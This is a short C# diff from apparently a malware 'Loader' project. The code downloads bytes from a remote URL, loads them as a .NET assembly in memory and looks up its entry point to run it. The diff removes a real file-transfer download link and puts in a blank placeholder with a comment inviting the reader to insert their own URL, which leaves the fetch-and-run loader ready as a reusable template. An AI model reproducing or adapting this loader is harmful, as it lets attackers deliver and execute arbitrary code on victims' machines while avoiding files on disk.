@@ -32,7 +32,7 @@ namespace Loader
                 Environment.Exit(0);   
             }
 
-            byte[] bin = new WebClient().DownloadData("https://s22.filetransfer.io/storage/download/nR2n92DbW9fv");
+            byte[] bin = new WebClient().DownloadData(""); // Insert your crappy URL here
             Assembly a = Assembly.Load(bin);
             MethodInfo method = a.EntryPoint;
             object o = a.CreateInstance(method.Name);
